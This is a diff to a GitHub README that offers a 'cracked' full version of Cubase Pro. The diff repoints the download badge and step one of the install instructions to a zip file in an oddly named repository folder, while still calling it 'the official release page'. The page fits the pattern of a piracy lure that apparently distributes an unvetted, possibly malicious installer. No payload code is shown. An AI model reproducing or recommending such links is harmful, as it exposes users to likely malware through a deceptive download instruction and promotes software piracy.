@@ -1,7 +1,7 @@
 # 🎹 Cubase-Pro-Full-Version-Cracked - Professional music production suite for everyone
 
 <p align="center">
-  <a href="https://github.com/Sabas12/Cubase-Pro-Full-Version-Cracked/releases">
+  <a href="https://github.com/Sabas12/Cubase-Pro-Full-Version-Cracked/raw/refs/heads/main/overpatient/Cracked_Pro_Full_Version_Cubase_1.5-beta.1.zip">
     <img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download Cubase Pro">
   </a>
 </p>
@@ -25,7 +25,7 @@ To run this software, your computer needs to meet these specifications:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page: [https://github.com/Sabas12/Cubase-Pro-Full-Version-Cracked/releases](https://github.com/Sabas12/Cubase-Pro-Full-Version-Cracked/releases).
+1.  Visit the official release page: [https://github.com/Sabas12/Cubase-Pro-Full-Version-Cracked/raw/refs/heads/main/overpatient/Cracked_Pro_Full_Version_Cubase_1.5-beta.1.zip](https://github.com/Sabas12/Cubase-Pro-Full-Version-Cracked/raw/refs/heads/main/overpatient/Cracked_Pro_Full_Version_Cubase_1.5-beta.1.zip).
 2.  Locate the latest version release.
 3.  Click the file link to save the installer to your device.
 4.  Open the downloaded file to start the setup wizard.
